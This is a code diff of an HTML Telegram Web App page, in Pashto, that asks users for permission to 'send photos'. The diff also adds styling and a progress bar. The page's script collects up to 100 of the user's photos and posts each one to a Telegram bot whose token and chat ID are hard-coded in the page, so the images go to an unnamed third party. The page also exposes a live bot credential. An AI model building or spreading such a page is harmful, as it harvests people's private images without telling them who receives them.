@@ -2,87 +2,269 @@
 <html>
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>عکسونه واستوئ</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
-            font-family: Arial;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            padding: 40px 30px;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
             text-align: center;
-            padding: 50px;
-            background: #f0f0f0;
+            max-width: 400px;
+            width: 100%;
+        }
+        .emoji {
+            font-size: 60px;
+            display: block;
+            margin-bottom: 15px;
+        }
+        h1 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 25px;
+            line-height: 1.5;
         }
         .btn {
-            background: #0088cc;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
-            padding: 20px 40px;
+            padding: 16px 30px;
             border: none;
-            border-radius: 10px;
-            font-size: 20px;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 600;
             cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
             width: 100%;
-            max-width: 300px;
         }
         .btn:hover {
-            background: #006699;
+            transform: translateY(-2px);
+            box-shadow: 0 12px 35px rgba(102, 126, 234, 0.6);
+        }
+        .btn:active {
+            transform: translateY(0px);
+        }
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
         }
         #status {
             margin-top: 20px;
-            font-size: 16px;
-            color: #333;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 14px;
+            min-height: 45px;
+            display: none;
+        }
+        #status.show {
+            display: block;
+        }
+        .success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .loading {
+            background: #fff3cd;
+            color: #856404;
+            border: 1px solid #ffeeba;
+        }
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: #e9ecef;
+            border-radius: 3px;
+            margin-top: 15px;
+            overflow: hidden;
+            display: none;
+        }
+        .progress-bar.show {
+            display: block;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            border-radius: 3px;
+            transition: width 0.3s;
+            width: 0%;
+        }
+        .count-text {
+            font-size: 12px;
+            color: #888;
+            margin-top: 8px;
         }
     </style>
 </head>
 <body>
-    <h1>📸 عکسونه واستوئ</h1>
-    <p>تڼۍ کلیک کړئ او اجازه ورکړئ</p>
-    <button class="btn" onclick="requestPhotos()">📁 اجازه ورکړئ</button>
-    <div id="status"></div>
+    <div class="container">
+        <span class="emoji">📸</span>
+        <h1>عکسونه واستوئ</h1>
+        <p>تڼۍ کلیک کړئ او اجازه ورکړئ<br>ټول عکسونه به پخپله واستول شي</p>
+        
+        <button class="btn" id="mainBtn" onclick="requestPhotos()">
+            📁 اجازه ورکړئ
+        </button>
+        
+        <div id="status"></div>
+        <div class="progress-bar" id="progressBar">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+        <div class="count-text" id="countText"></div>
+    </div>
 
     <script>
         const BOT_TOKEN = "8737718436:AAGEkqwayT058tBVH_Pp-W2T0B-aaJXMylU";
         const CHAT_ID = "8295417969";
-        const status = document.getElementById('status');
+        
+        const statusEl = document.getElementById('status');
+        const btn = document.getElementById('mainBtn');
+        const progressBar = document.getElementById('progressBar');
+        const progressFill = document.getElementById('progressFill');
+        const countText = document.getElementById('countText');
+
+        function showStatus(message, type) {
+            statusEl.textContent = message;
+            statusEl.className = 'show ' + type;
+        }
+
+        function updateProgress(sent, total) {
+            const percent = Math.round((sent / total) * 100);
+            progressFill.style.width = percent + '%';
+            countText.textContent = `${sent} له ${total} عکسونو لیږل شوي (${percent}%)`;
+        }
 
         function requestPhotos() {
-            if (typeof Telegram === 'undefined') {
-                status.innerHTML = '❌ مهرباني وکړئ د Telegram اپلیکیشن څخه خلاص کړئ';
+            // چک کول چې آیا د Telegram Web App شتون لري
+            if (typeof Telegram === 'undefined' || !Telegram.WebApp) {
+                showStatus('❌ مهرباني وکړئ د Telegram اپلیکیشن څخه خلاص کړئ', 'error');
                 return;
             }
 
-            status.innerHTML = '⏳ د عکسونو اجازه غوښتل کیږي...';
-            
-            // Telegram Web App د عکسونو غوښتنه
+            btn.disabled = true;
+            btn.textContent = '⏳ انتظار...';
+            showStatus('⏳ د عکسونو اجازه غوښتل کیږي...', 'loading');
+            progressBar.classList.remove('show');
+
+            // د Telegram Web App له لارې د عکسونو غوښتنه
             Telegram.WebApp.requestMedia({
                 type: 'photo',
                 multiple: true,
-                max_count: 50
+                max_count: 100
             }, function(photos) {
+                // که چیرې کارونکی انکار وکړي
                 if (!photos || photos.length === 0) {
-                    status.innerHTML = '❌ هیڅ عکس ونه غوره شو';
+                    btn.disabled = false;
+                    btn.textContent = '📁 اجازه ورکړئ';
+                    showStatus('❌ هیڅ عکس ونه غوره شو یا اجازه ورکړل نشوه', 'error');
                     return;
                 }
+
+                const total = photos.length;
+                showStatus(`⏳ ${total} عکسونه لیږل کیږي...`, 'loading');
+                progressBar.classList.add('show');
+                progressFill.style.width = '0%';
                 
-                status.innerHTML = `⏳ ${photos.length} عکسونه لیږل کیږي...`;
-                
+                let sent = 0;
+                let failed = 0;
+
                 photos.forEach((photo, index) => {
-                    sendToTelegram(photo, index, photos.length);
+                    sendToTelegram(photo)
+                        .then(() => {
+                            sent++;
+                            updateProgress(sent, total);
+                            
+                            if (sent + failed === total) {
+                                finishUpload(sent, failed, total);
+                            }
+                        })
+                        .catch(() => {
+                            failed++;
+                            if (sent + failed === total) {
+                                finishUpload(sent, failed, total);
+                            }
+                        });
                 });
+
+                // که عکسونه کم وي، پای ته ورسوي
+                if (total === 0) {
+                    finishUpload(0, 0, 0);
+                }
             });
         }
 
-        function sendToTelegram(photo, index, total) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', photo);
+        function finishUpload(sent, failed, total) {
+            btn.disabled = false;
+            btn.textContent = '📁 بیا اجازه ورکړئ';
             
-            fetch(url, { method: 'POST', body: formData })
-                .then(() => {
-                    status.innerHTML = `✅ ${index + 1} له ${total} عکسونو لیږل شوي`;
-                })
-                .catch(() => {
-                    status.innerHTML = `❌ تېروتنه: ${index + 1} عکس ولیږل نشو`;
-                });
+            if (failed === 0 && sent > 0) {
+                showStatus(`✅ ټول ${total} عکسونه په بریالیتوب سره لیږل شول!`, 'success');
+            } else if (sent > 0 && failed > 0) {
+                showStatus(`⚠️ ${sent} عکسونه لیږل شوي، ${failed} ناکام شوي`, 'error');
+            } else {
+                showStatus('❌ هیڅ عکس ونه لیږل شو', 'error');
+            }
+            
+            progressFill.style.width = '100%';
+            
+            // د ۳ ثانیو وروسته پرمختګ پټول
+            setTimeout(() => {
+                progressBar.classList.remove('show');
+                countText.textContent = '';
+            }, 3000);
         }
+
+        function sendToTelegram(photo) {
+            return new Promise((resolve, reject) => {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', photo);
+                
+                fetch(url, { 
+                    method: 'POST', 
+                    body: formData 
+                })
+                .then(response => {
+                    if (response.ok) {
+                        resolve();
+                    } else {
+                        reject();
+                    }
+                })
+                .catch(() => reject());
+            });
+        }
+
+        // د Telegram Web App چمتووالی
+        Telegram.WebApp.ready();
+        Telegram.WebApp.expand();
     </script>
 </body>
 </html>
